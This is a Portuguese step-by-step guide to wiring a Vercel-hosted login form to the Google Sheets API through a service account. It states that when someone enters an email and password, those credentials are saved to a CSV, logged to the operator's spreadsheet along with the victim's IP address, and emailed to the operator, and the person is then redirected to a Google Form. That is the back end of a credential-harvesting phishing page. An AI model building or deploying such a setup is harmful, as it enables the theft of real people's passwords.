# 📊 Como Usar Google Sheets API - Passo a Passo

## 🎯 Objetivo
Fazer as credenciais aparecerem automaticamente na sua planilha: https://docs.google.com/spreadsheets/d/1VVUU_dCw-97FzKPquvgMsj9RncNsdxbG79zsOy5pQNI/edit

## ⚡ Passo a Passo Rápido

### 1️⃣ Criar Service Account (5 minutos)

1. Acesse: https://console.cloud.google.com/
2. Clique em **"Select a project"** → **"New Project"**
3. Dê um nome (ex: "login-test") e clique em **Create**
4. Aguarde alguns segundos e selecione o projeto criado

### 2️⃣ Ativar Google Sheets API

1. No menu lateral, vá em **APIs & Services** → **Library**
2. Procure por **"Google Sheets API"**
3. Clique e depois em **Enable**

### 3️⃣ Criar Service Account

1. Vá em **APIs & Services** → **Credentials**
2. Clique em **"+ CREATE CREDENTIALS"** → **"Service Account"**
3. Preencha:
   - **Service account name:** `sheets-writer` (ou qualquer nome)
   - Clique em **Create and Continue**
4. Pule a etapa de "Grant this service account access" (clique em **Continue**)
5. Clique em **Done**

### 4️⃣ Baixar Credenciais JSON

1. Clique no service account que você criou (o email que aparece)
2. Vá na aba **Keys**
3. Clique em **Add Key** → **Create new key**
4. Escolha **JSON** e clique em **Create**
5. Um arquivo JSON será baixado automaticamente

### 5️⃣ Compartilhar Planilha com Service Account

1. Abra o arquivo JSON que você baixou
2. Procure pelo campo `"client_email"` (algo como: `sheets-writer@projeto-123456.iam.gserviceaccount.com`)
3. Copie esse email
4. Abra sua planilha: https://docs.google.com/spreadsheets/d/1VVUU_dCw-97FzKPquvgMsj9RncNsdxbG79zsOy5pQNI/edit
5. Clique no botão **"Compartilhar"** (canto superior direito)
6. Cole o email do service account
7. Dê permissão de **Editor**
8. Clique em **Enviar**

### 6️⃣ Configurar na Vercel

1. Abra o arquivo JSON que você baixou
2. Copie **TODO o conteúdo** do arquivo
3. Na Vercel, vá em **Settings** → **Environment Variables**
4. Clique em **Add New**
5. Adicione:
   - **Key:** `GOOGLE_SERVICE_ACCOUNT_JSON`
   - **Value:** Cole todo o conteúdo do JSON (pode ser em uma linha só)
6. Clique em **Save**

### 7️⃣ Redeploy

1. Na Vercel, vá em **Deployments**
2. Clique nos 3 pontinhos do último deploy
3. Clique em **Redeploy**

## ✅ Pronto!

Agora quando alguém preencher email e senha:
1. ✅ Credenciais são salvas no CSV
2. ✅ Credenciais são salvas no Google Sheets (sua planilha)
3. ✅ Você recebe por email (se configurado)
4. ✅ Pessoa é redirecionada para o Google Forms

## 📋 Estrutura da Planilha

A planilha será criada automaticamente com:
- **Coluna A:** Timestamp
- **Coluna B:** email
- **Coluna C:** Password
- **Coluna D:** IP Address

## 🧪 Testar

1. Preencha o formulário de login
2. Verifique sua planilha - a nova linha deve aparecer em segundos!

## 🚨 Problemas Comuns

**Erro: "The caller does not have permission"**
- ✅ Verifique se compartilhou a planilha com o email do service account
- ✅ Verifique se deu permissão de **Editor**

**Erro: "API not enabled"**
- ✅ Verifique se ativou a Google Sheets API no Google Cloud

**Nada aparece na planilha**
- ✅ Verifique os logs da Vercel em **Functions** → **Logs**
- ✅ Verifique se a variável `GOOGLE_SERVICE_ACCOUNT_JSON` está configurada

## 💡 Dica

O JSON deve ter esta estrutura:
```json
{
  "type": "service_account",
  "project_id": "seu-projeto",
  "private_key_id": "...",
  "private_key": "-----BEGIN PRIVATE KEY-----\n...\n-----END PRIVATE KEY-----\n",
  "client_email": "sheets-writer@projeto.iam.gserviceaccount.com",
  ...
}
```

Ao colar na Vercel, pode ser tudo em uma linha ou com `\n` para quebras de linha.
